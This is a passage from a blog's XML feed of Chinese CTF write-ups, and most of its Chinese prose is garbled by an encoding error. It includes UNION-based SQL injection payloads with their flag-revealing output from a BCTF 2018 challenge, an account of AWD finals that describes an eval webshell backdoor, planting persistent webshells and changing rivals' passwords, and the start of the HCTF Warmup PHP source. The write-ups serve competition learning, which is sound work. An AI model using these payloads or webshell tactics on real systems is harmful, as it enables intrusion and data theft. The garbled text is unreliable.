class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è®© bot è®¿é—®ï¼Œæ‰“å›æ¥çš„ä¿¡æ¯ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-04b08aadae37a33d.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token&#x3D;53fa3bf04f6342ed2bbad38c3ce08af6&amp;content&#x3D;&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug info:SELECT timestamp,user_name,uid,is_checked FROM feedbacks  where is_checked&#x3D;-1 order by 3# ORDER BY id DESC limit 0,50&quot;&#125;</span><br></pre></td></tr></table></figure><p>æŠŠæŠ¥é”™ä¿¡æ¯éƒ½ç»™å‡ºæ¥äº†ï¼Œçœ‹æ•°æ®åº“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status&#x3D;-1 union select 1,database(),3,4#</span><br></pre></td></tr></table></figure><p>è¿”å›ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?token&#x3D;71824ddc687a213d91b0376c81aa0dae&amp;content&#x3D;&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;bctf2018&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure><p>çœ‹è¡¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status&#x3D;-1 union select 1,table_name,3,4 from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure><p>è¿”å›ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token&#x3D;9914988256d8169f0d3d4bd4b3e45285&amp;content&#x3D;&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;admin&quot;,&quot;3&quot;,&quot;4&quot;],[&quot;1&quot;,&quot;f111111ag&quot;,&quot;3&quot;,&quot;4&quot;],[&quot;1&quot;,&quot;feedbacks&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥ flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">status&#x3D;-1 union select *,2,3,4 from f111111ag# </span><br></pre></td></tr></table></figure><p>è¿”å›ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-d63b58e4c6c97c39.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?token&#x3D;8be48bdbe1c914d11532f9bd4b6a192d&amp;content&#x3D;&#123;&quot;result&quot;:[[&quot;bctf&#123;XsS_SQL1_7438x_2xfccmk&#125;&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>bctf{XsS_SQL1_7438x_2xfccmk}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸Šæµ·èµ›çº¿ä¸‹ä¸æ¹–æ¹˜æ¯å†³èµ›</title>
      <link href="/2018/11/30/%E8%AE%B0%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E4%B8%8E%E6%B9%96%E6%B9%98%E6%9D%AF%E5%86%B3%E8%B5%9B/"/>
      <url>/2018/11/30/%E8%AE%B0%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E4%B8%8E%E6%B9%96%E6%B9%98%E6%9D%AF%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h4 id="ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ›çº¿ä¸‹èµ›"><a href="#ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ›çº¿ä¸‹èµ›" class="headerlink" title="ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ›çº¿ä¸‹èµ›"></a>ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ›çº¿ä¸‹èµ›</h4><p>emmmm æ„Ÿè§‰åˆç©æˆäº†å¤§ä¹±æ–—æ¨¡å¼ã€‚</p><p>ä¸¤ä¸ª Web ä¸€ä¸ª Pwnï¼Œæˆ‘ä»¬é˜Ÿæ¯”è¾ƒä½›ç³»ï¼Œæ¥äº†ä¸¤ä¸ª Web æ‰‹å’Œä¸€ä¸ªé€†å‘æ‰‹ï¼Œé€†å‘æ‰‹å…¨ç¨‹ patch å°±å®Œäº†ï¼Œpwn åˆ°ä¸‹åˆæ‰æœ‰äººæ‰“å‡ºæ¥ï¼Œpwn ä¹Ÿå·®ä¸äº†å¤ªå¤šï¼Œä¸»è¦æ˜¯ Webã€‚</p><p>æ¯”èµ›å¼€å§‹æ­£å¸¸å¤‡ä»½æ”¹å¯†ç ï¼Œç„¶å D ç›¾æ‰«äº†ä¸€æ³¢ï¼Œå¹¶æ²¡æœ‰æ‰«å‡ºä»€ä¹ˆåé—¨ï¼Œä¸å¯¹å•Šè¿™ç§æ¯”èµ›åº”è¯¥ä¼šæœ‰é¢„ç•™åé—¨çš„ã€‚ã€‚ã€‚ ç„¶åæƒŠå¥‡å‘ç°æœ‰é˜Ÿå¼€å§‹æ‰“ web2äº†ï¼Œæ¯”è¾ƒæ‡µé€¼ã€‚</p><p>è¢«æ‰“äº†ä¸è¡Œé©¬ä¸ŠæŠ“æµé‡ï¼Œæˆ‘æŠ“æµé‡çš„è„šæœ¬ä¸Šå»ä½†æ˜¯ä¸å¥½ä½¿ã€‚ã€‚ã€‚è¿ç»´å¤§æ‰‹å­æŠ“äº†ä¸‹æµé‡ï¼Œå‘ç°åŸæ¥å°¼ç›ä¸»åŠæ–¹é¢„ç•™äº†ä¸ªåé—¨ï¼š</p><a id="more"></a><p><img src="https://upload-images.jianshu.io/upload_images/9223743-fc28432f1e099fb0.png" alt="image.png"></p><p>è¿™åé—¨ç•™çš„æˆ‘ä¹Ÿæ˜¯ä½›äº†ï¼Œè—åœ¨äº† hits æ–‡ä»¶å¤¹äº†ï¼Œä¸å¾—ä¸è¯´å®˜æ–¹é¢„ç•™åé—¨è¶Šæ¥è¶Šéšè”½äº†ã€‚</p><p>å¤§å®¶å¤§éƒ¨åˆ†éƒ½æ˜¯ç›´æ¥ cat /flagï¼Œè€Œæˆ‘æƒ³ç€ç§ä¸Šä¸æ­»é©¬ï¼Œä½†æ˜¯æˆ‘çš„è„šæœ¬é€‚ç”¨äº php evalå‘½ä»¤æ‰§è¡Œçš„â€¦ æ‰€ä»¥ä¸èƒ½ç›´æ¥ç”¨ï¼Œè¿˜è¦ç”¨ç»ˆç«¯ <code>echo &quot;é©¬&quot; &gt; &quot;æ–‡ä»¶å&quot;</code>è¿™æ ·æ¥å†™ï¼Œå°±å¾ˆéº»çƒ¦ï¼Œä¸æ­»é©¬ä¸­å•å¼•å·åŒå¼•å·æçš„æˆ‘å¾ˆéš¾å—ã€‚</p><p>æ²¡åŠæ³•æœ€åæˆ‘å…ˆå†™äº†ä¸ªç®€å•çš„ä¸€å¥è¯è¿›å»ï¼Œç„¶åç”¨ç®€å•çš„ä¸€å¥è¯å†™ä¸æ­»é©¬ï¼Œä½†æ˜¯å¤§å®¶å·²ç»ä¿®çš„å·®ä¸å¤šäº†emmmã€‚</p><p>åŸºæœ¬å°±æ˜¯ç”¨è¿™ä¸ªæ´å’Œä¸æ­»é©¬å¾—åˆ†ï¼Œç„¶å web1 å¼€å§‹å®•æœºï¼Œæ€ä¹ˆä¿®ä¹Ÿä¿®ä¸å¥½ï¼Œåªå¥½å»é‡ç½®æœåŠ¡ï¼Œå› ä¸ºçœŸçš„æ˜¯å®•æœºæ‰£åˆ†å¤ªå¤šäº†ã€‚</p><p>å¥½äº†æ²¡æœ‰å¤šé•¿æ—¶é—´ï¼Œåˆå®•æœºäº†ï¼Œæ‰æ„è¯†è‚¯å®šæ˜¯æœ‰äººæ…å±ï¼Œç„¶åå‘ç°æ•°æ®åº“è¢«äººåŠ¨äº†ï¼Œä¿®äº†åŠå¤©ä¹Ÿæ²¡ä¿®ä¸Šï¼Œä¸»åŠæ–¹ä¹Ÿæ²¡è¯´é‡ç½®æœåŠ¡æ‰£å¤šå°‘åˆ†ï¼Œä¹Ÿæ²¡å»é‡ç½®æœåŠ¡ã€‚</p><p>ç„¶åè¿˜æœ‰åŠå°æ—¶ç»“æŸçš„æ—¶å€™ï¼Œä¸»åŠæ–¹è¯´å…è´¹ä¸‰æ¬¡é‡ç½®ï¼Œè¶…è¿‡æ¬¡æ•°æ‰£åˆ†ï¼Œä½†æ˜¯æœ€ååŠå°æ—¶ä¸èƒ½é‡ç½®æœåŠ¡äº†ã€‚ã€‚ã€‚å°±è¿™æ ·è‹Ÿåˆ°æœ€åï¼Œèµ›åå’Œå¸ˆå‚…ä»¬äº¤æµï¼Œéƒ½æ˜¯ä¸€å¤§æ‰¹ä¸€å¤§æ‰¹å»é‡ç½®æœåŠ¡ï¼Œå› ä¸ºé‡ç½®æ‰£çš„åˆ†æ²¡æœ‰æœåŠ¡æ­£å¸¸åŠ çš„åˆ†å¤šâ€¦ æœåŠ¡å®•æœºæ‰£çš„åˆ†çœŸæ˜¯å¤ªç‹ äº†ã€‚</p><p>web1 åå°æœ‰å¼±å¯†ç ï¼Œæ”¹äº†å¯†ç å› ä¸ºæºç é‡Œå†™çš„æ˜¯åŸæ¥çš„é¢„ç•™å¯†ç ï¼Œæ‰€ä»¥è¿ä¸ä¸Šæ•°æ®åº“å°±å®•æœºï¼Œç¬¬ä¸€çš„é˜Ÿä¼ï¼Œå°±æ˜¯é ç–¯ç‹‚æ”¹åˆ«äººçš„å¯†ç ï¼Œç„¶åç–¯ç‹‚æ‹¿æœåŠ¡æ­£å¸¸çš„åˆ†ï¼Œåªèƒ½è¯´è¿™ä¸ªæ¯”èµ›æˆ‘ä¹Ÿæ˜¯ä½›äº†ï¼Œä»–ä»¬é˜Ÿåˆ°å¿«ä¸­åˆçš„æ—¶å€™ï¼Œweb2 é¢„ç•™åé—¨çš„æ´è¿˜æ²¡æœ‰ä¿®ã€‚</p><p>è¿™é‡Œå¾—è¯´ä¸€ä¸‹ web1ï¼Œå…¨åœºéƒ½æ²¡äººæ‰“åŠ¨ï¼Œè¿™ä¸ªweb1ç»™æˆ‘ä»¬çš„ç”¨æˆ·æƒé™å¤ªä½äº†ï¼Œ/var/www/html éƒ½æ²¡æœ‰å†™æƒé™ï¼Œé‚£æ‰“ä¸ªé”¤å­ã€‚ã€‚ã€‚ å¿«ç»“æŸçš„æ—¶å€™é˜Ÿå‹å‘ç°äº†ä¸ªéšè—çš„ apache ç”¨æˆ·ï¼Œä½†æ˜¯æ²¡æœ‰å¯†ç ï¼Œèµ›åå¬è¯´ç›´æ¥ su ä¸ç”¨å¯†ç ä¹Ÿèƒ½ç™»å½•ï¼Ÿå‡ºé¢˜äºº Â· çœŸå®ã€‚</p><p>æ€»ç»“ä¸€ä¸‹æ¯”èµ›ï¼š</p><ol><li>å¼ºé˜Ÿé æŒ–æ´ï¼Œå¼±é˜Ÿé æŠ“æµé‡ï¼ŒæŠ“æµé‡çš„è„šæœ¬ä¸€å®šè¦å‡†å¤‡å¥½ï¼Œè¿™æ ·çš„è¯å¯ä»¥æŠ„ä½œä¸šç›´æ¥æ‰“ï¼›</li><li>é˜²å¾¡åšçš„è¿˜ä¸å¥½ï¼Œæ¯”å¦‚è¿™æ¬¡å¿˜å¤‡ä»½æ•°æ®åº“äº†â€¦ è¿˜æœ‰å°±æ˜¯æ–‡ä»¶ç›‘æ§ä¹‹ç±»çš„è„šæœ¬ï¼Œä»¥åŠæŸ¥çœ‹è¿›ç¨‹åŠæ—¶æ€ä¸æ­»é©¬ä¹‹ç±»çš„ï¼›</li><li>æ‰“å®•åˆ«äººæœåŠ¡ï¼Œå¯ä»¥æ‹¿å¾ˆå¤šåˆ†ï¼Œæœ‰æ—¶å€™ä½ æ‰“ä¸æˆï¼Œä½†æ˜¯ä½ æŠŠåˆ«äººæœåŠ¡éƒ½æ‰“å®•ï¼Œå¯èƒ½ä½ å°±èµ¢äº†â€¦æŠŠåˆ«äººæ‰“å®•è¿˜å¯ä»¥è®©ä»–ä»¬çš„ web æ‰‹å¿™äºä¿®ï¼Œæ²¡æ³•ä¸“å¿ƒå®¡ä»£ç æŒ–æ´ã€‚</li></ol><p>ä¸œåå¤§å­¦é‚£ä¸ªå–œå¤©æ¸¸é…’åº—å¥½è´µå•Šï¼Œä¸€æ™šä¸ŠåŒäººæ ‡é—´ 350ï¼Œæ²¡æœ‰å•äººé—´ï¼Œç„¶åæˆ‘ä»¬ä¸‰ä¸ªäººåªå¥½ä¸¤ä¸ªåŒäººæ ‡é—´ï¼Œä½äº†ä¸¤æ™šï¼Œæˆ‘çš„ä¸¤ä¸ªé˜Ÿå‹æ¯”èµ›ç¬¬äºŒå¤©æ—©ä¸Šå°±åé£æœºå›å­¦æ ¡äº†ï¼Œè€Œæˆ‘åé£æœºå»é•¿æ²™æ‰“æ¹–æ¹˜æ¯ã€‚</p><h4 id="æ¹–æ¹˜æ¯çº¿ä¸‹"><a href="#æ¹–æ¹˜æ¯çº¿ä¸‹" class="headerlink" title="æ¹–æ¹˜æ¯çº¿ä¸‹"></a>æ¹–æ¹˜æ¯çº¿ä¸‹</h4><p>ä¸‹é£æœºå‘ç°æœºåœºè¿åœ°é“éƒ½æ²¡æœ‰â€¦ å¯¼èˆªå‘ç°å»é…’åº—åå…¬äº¤è¦è½¬å¥½å¤šç«™ï¼Œç›´æ¥æ‰“äº†ä¸ªå‡ºç§Ÿè¿‡å»ã€‚</p><p>å»æŠ¥é“å‘ç°æ¹–å—äººåŸæ¥ä¹Ÿå¥½çƒ­æƒ…ï¼Œç»„ç»‡äººå‘˜çš„æœåŠ¡éƒ½ç‰¹åˆ«å¥½ã€‚æˆ‘ä¸­åˆ1ç‚¹å·¦å³åˆ°çš„é…’åº—ï¼Œæœ‰å¾ˆå¤šçš„æœåŠ¡äººå‘˜ï¼Œçƒ­å¿ƒåœ°ç»™æˆ‘åŠæŠ¥é“å’Œå…¥ä½çš„ç›¸å…³æ‰‹ç»­ï¼Œé—®æˆ‘åƒæ²¡åƒåˆé¥­ï¼Œæˆ‘è¯´æ²¡åƒä»–ä»¬è¿˜é¢†æˆ‘å»é‡Œé¢åƒäº†åˆé¥­ï¼Œå¾ˆ nice!</p><p>ä¸å¾—ä¸è¯´ï¼Œæ¹–æ¹˜æ¯ä¸»åŠæ–¹æ˜¯çœŸçš„æœ‰é’±ï¼Œæ¯”èµ›å¥–é‡‘70ä¸ªé˜Ÿä¸€ä¸ªé˜Ÿ3kï¼Œç¬¬ä¸€å16wä¸è¯´ï¼Œè®©æˆ‘ä»¬ä½é•¿æ²™çº¢æ˜Ÿå›½é™…é…’åº—ï¼Œé…’åº—ä½çš„éå¸¸èˆ’æœï¼ŒæœåŠ¡å¾ˆåˆ°ä½ï¼Œç®¡åƒç®¡ä½æ¡ä»¶è¿˜è¿™ä¹ˆå¥½å¯ä»¥è¯´æ˜¯éå¸¸è‰¯å¿ƒäº†ã€‚</p><p>ä¸€å¤©åŠçš„æ¯”èµ›ï¼Œç¬¬ä¸€å¤©ä¸Šåˆæ˜¯ AWD æ¨¡å¼ï¼Œç¬¬ä¸€å¤©ä¸‹åˆæ˜¯ KingTheHill æ¨¡å¼ï¼Œç¬¬äºŒå¤©ä¸‹åˆæ˜¯çœŸå®æ¸—é€çš„æ¨¡å¼ï¼Œå¯¹äºè¿™ä¸€å¤©åŠçš„æ¯”èµ›ï¼Œæˆ‘åªèƒ½è¯´è¿™æ¯”èµ›æ§½ç‚¹å¤ªå¤šäº†â€¦</p><p>å…¨åœºå±è”½ä¿¡å·ä¸è®¸å¤–ç½‘ï¼Œç„¶åæˆ‘ä»¬ä»€ä¹ˆä¹Ÿæ²¡å‡†å¤‡ï¼Œé™¤äº† AWD å…¶ä»–æ—¶é—´éƒ½æ˜¯åŸºæœ¬åœ¨æ‘¸é±¼ï¼Œå…¨éƒ½æ˜¯ cms ç”ŸæŒ–æŒ–ä¸åŠ¨å•Šâ€¦</p><p>è€Œä¸” AWD æ¨¡å¼æ‰“çš„ååˆ†æ··ä¹±ï¼Œå¾ˆæ¶å¿ƒã€‚</p><ol><li>80 ä¸ªé˜Ÿï¼Œç½‘å®åœ¨æ˜¯å¤ªå¡äº†ï¼Œç»å¸¸ä¸€ç›´åœ¨é‚£é‡Œè½¬å•Šè½¬ã€‚åªç»™äº†é¡µé¢æäº¤ flag çš„æ–¹å¼ï¼Œæˆ‘åªå¥½æŠ“åŒ…å»å†™äº¤flagçš„è„šæœ¬ï¼Œè€Œä¸”äº¤ flag çš„å¹³å°ä¹Ÿè€å´©ï¼Œè„šæœ¬å¡æ­»æ ¹æœ¬è·‘ä¸åŠ¨ï¼Œæˆ‘çš„è„šæœ¬åˆ°å¤„éƒ½æ˜¯ <code>try except pass</code>  â€¦</li><li>ä¸»åŠæ–¹åœ¨æ ¹ç›®å½•é¢„ç•™äº†ä¸ª .shell.php çš„åé—¨ï¼Œå¾ˆç›´æ¥å°±æ˜¯ <code>@eval($_POST[&#39;c&#39;])</code>ï¼Œä¸è¿‡æœ€éªšçš„æ˜¯è¿™ä¸ªåé—¨åˆ ä¸æ‰ã€‚ã€‚ã€‚åˆ äº†åå‡ åç§’å®ƒåˆä¼šè‡ªåŠ¨ç”Ÿæˆï¼Œæˆ‘ä»¥ä¸ºæ˜¯è¿›ç¨‹é‡Œçš„ç»“æœæ‰¾äº†åŠå¤©ä¹Ÿæ²¡å‘ç°ï¼Œæ²¡åŠæ³•åªå¥½å†™è„šæœ¬ä¸€ç›´åˆ è¿™ä¸ªåé—¨ã€‚</li><li>å¹³å°å·®è¯„ï¼Œåˆä¸‘åˆä¸å¥½ç”¨ï¼Œçœ‹ä¸åˆ°è‡ªå·±æœåŠ¡å™¨æƒ…å†µï¼Œè¢«æ‰“äº†å’Œå®•æœºäº†éƒ½ä¸çŸ¥é“â€¦</li><li>æœåŠ¡å™¨ ssh çš„å¯†ç ç«Ÿç„¶æ˜¯æ¯ä¸ªé˜Ÿçš„å¿—æ„¿è€…å‘Šè¯‰æˆ‘ä»¬ï¼Œå¿—æ„¿è€…å¥½åƒä¹Ÿä¸æ˜¯å¾ˆæ‡‚è¿™äº›æ‰€ä»¥ä¹Ÿå°±è¯´çš„ç¨€é‡Œç³Šæ¶‚çš„ï¼Œä¸è¿‡è¿˜å¥½æˆ‘ç®—æ˜¯å¬æ‡‚äº†æˆ‘ä»¬çš„å¿—æ„¿è€…è¯´çš„ï¼Œç”¨æˆ·åå¯†ç éƒ½æ˜¯ user å°±ç™»è¿›å»äº†ã€‚ä¸­åˆåƒé¥­æ‰å‘ç°åŸæ¥å¥½å¤šé˜Ÿéƒ½è¢«è¿™ä¸ªå¥‡è‘©çš„æ–¹æ³•å‘äº†ï¼Œæœ‰çš„é˜Ÿå‹æ ¹å°±æ²¡å¿—æ„¿è€…ï¼Œè¿˜æœ‰çš„é˜Ÿå¿—æ„¿è€…æ²¡è·Ÿä»–ä»¬è¯´ã€‚æœ‰ä¸ªåŒå­¦ä»–ä»¬ç«Ÿç„¶æ˜¯è‡ªå·±æŒ–æ´å†™é©¬ç„¶åèœåˆ€è¿ç»´æœåŠ¡å™¨â€¦æƒŠäº†ã€‚è¿˜æœ‰çš„é˜Ÿä¸Šæ¥ä¸“æ”¹åˆ«äººçš„ ssh å¯†ç ï¼Œè¢«æ”¹å¯†ç å°±å¾ˆæƒ¨ï¼Œæˆ‘æ„Ÿè§‰è¿™ä¸ªäº‹æƒ…æœ‰ç‚¹è‰¯å¿ƒä¸å®‰å°±åªæ”¹äº†è‡ªå·±çš„å¯†ç ã€‚</li><li>ä¸­åˆåƒé¥­å’Œä¸€èˆªå¸ˆå‚…èŠå¤©æ‰å¾—çŸ¥è¿™æ¯”èµ›é€‰æ‰‹é—´äº’é€šæ²¡éš”ç¦»ã€‚ã€‚ã€‚ä»–è¯´çœ‹åˆ°äº†å¥½å¤šé€‰æ‰‹å¼€äº† phpstudyï¼Œè¿˜æœ‰çš„ç›´æ¥å°±æ˜¯å¼±å¯†ç ï¼Œç›´æ¥å¯ä»¥æ‰“è¿›é€‰æ‰‹ç”µè„‘é‡Œâ€¦å½“æ—¶å¹¸äºæˆ‘æ²¡å¼€å•¥ç«¯å£å’ŒæœåŠ¡ä¸ç„¶è‡ªå·±ä¸»æœºç›´æ¥è¢«æ—¥äº†2333ã€‚è¿˜æœ‰çš„é€‰æ‰‹ç”µè„‘è¢«ææƒäº†ï¼Œå¤ªç‹ äº†ã€‚</li><li>æ¯”èµ›å¿«ç»“æŸæˆ‘å…¨å±€ä¸€æœ eval æ‰å‘ç°åŸæ¥ä¸»åŠæ–¹è¿˜ç•™äº†ä¸€ä¸ªåé—¨â€¦ ç•™çš„åé—¨æœ‰ä¸¶å¤šå•Š mmpï¼Œæˆ‘ä»¬ä¸€ç›´è¢«æ‰“è€Œä¸”è¿˜è¢«ç§äº†ä¸æ­»é©¬ï¼Œå¾ˆéš¾å—ï¼Œ</li></ol><p>æ„Ÿè§‰ AWD æ¯”è¾ƒå¯æƒœï¼Œå‘ç°äº†é¢„ç•™åé—¨åæˆ‘ç›´æ¥æŠŠæˆ‘ä¸æ­»é©¬çš„è„šæœ¬ç§ä¸Šå»äº†ï¼Œä½†æ˜¯ç”±äºæ¯”è¾ƒå¡çš„ç¼˜æ•…ï¼Œæˆ‘å†™è¿›å»äº†ç”Ÿæˆä¸æ­»åé—¨çš„ php æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æœ‰åŠæ—¶è®¿é—®è®©è¿™ä¸ª php æ‰§è¡Œã€‚å…¶å®æˆ‘è¿™ä¸ªéƒ½æ˜¯ä¸€å¥—çš„ï¼Œå†™è¿›å»ç„¶åè®¿é—®ï¼Œéƒ½æ˜¯ä¸€å¥—è‡ªåŠ¨æ‰§è¡Œï¼Œåªæ˜¯æ¯”èµ›å¹³å°å¤ªå¡äº†ï¼Œæˆ‘çš„è„šæœ¬è¿˜è€å¼‚å¸¸ï¼Œå°±éå¸¸éš¾å—ï¼Œæ²¡æœ‰æŠŠä¸æ­»é©¬ç§ä¸Šã€‚ä¸­åˆæœ‰äººè·Ÿæˆ‘è¯´çœ‹åˆ°äº†æˆ‘å†™çš„ gml.phpï¼Œç›´æ¥å°±ç»™åˆ äº†ï¼Œæˆ‘å¿ƒé‡Œæ˜¯å‡‰å‡‰çš„ã€‚ã€‚ã€‚åªå¯æƒœæ²¡æœ‰åŠæ—¶è®¿é—®è¿™ä¸ª gml.phpã€‚</p><p>åé¢ä¸¤åœºå› ä¸ºæ²¡å¤–ç½‘å¦‚åŒåºŸäº†ï¼ŒåŸºæœ¬å…¨ç¨‹æ‘¸é±¼ã€‚æˆ‘ä»¬é˜Ÿåœ¨ä¸€ä¸ªè§’è½é‡Œï¼Œåé¢æ­£å¥½æœ‰åƒçš„å–çš„ï¼Œç„¶åæˆ‘ä»¬å°±ä¸€ç›´åƒå–ï¼Œå¥½å¤šé˜Ÿéƒ½ä¸çŸ¥é“é‚£é‡Œæœ‰åƒçš„2333ï¼Œå¾ˆèˆ’æœã€‚</p><p>å› ä¸ºå­¦æ ¡æœ‰äº‹æƒ…ç¬¬äºŒå¤©ä¸‹åˆå°±èµ¶ç´§å›å­¦æ ¡äº†ï¼Œæ­£å¥½æœ‰ BCTFï¼Œè“è²èŠ±å‡ºé¢˜å›½é™…èµ›é¢˜ç›®è´¨é‡åº”è¯¥å¾ˆé«˜è€Œä¸”å°è¥¿å¸ˆå‚…è¯´ä»–å‡ºçš„é¢˜å¾ˆæœ‰è¶£ï¼Œå°±åšäº†åšé¢˜ï¼Œç„¶åå°±è‡ªé—­äº†ï¼Œä¸å¤šè¯´ä¸Šä¸€ä¸‹ BCTF çš„è§£é¢˜æƒ…å†µï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-7dd8115fe2774196.png" alt="image.png"></p><p>Blue-Lotus çš„å¸ˆå‚…ä»¬å¤ªå¼ºäº†ï¼Œç­‰ç€ docker å¤ç°ä¸€æ³¢å§â€¦.</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> çº¿ä¸‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 HCTF æ€»ç»“</title>
      <link href="/2018/11/13/2018-HCTF/"/>
      <url>/2018/11/13/2018-HCTF/</url>
      
        <content type="html"><![CDATA[<p>æ‰“äº†ä¸€ä¸‹ HCTFï¼Œæ„Ÿè§‰é¢˜ç›®è´¨é‡å¾ˆå¥½ï¼Œå­¦åˆ°äº†ä¸€äº›æ–°å§¿åŠ¿ã€‚èµ›åçœ‹äº†ä¸‹å„å¤§é¡¶å°–æˆ˜é˜Ÿå¸ˆå‚…ä»¬çš„ wpï¼Œæ€»ç»“ä¸€ä¸‹ã€‚</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><p>æç¤ºæºç ï¼š</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span 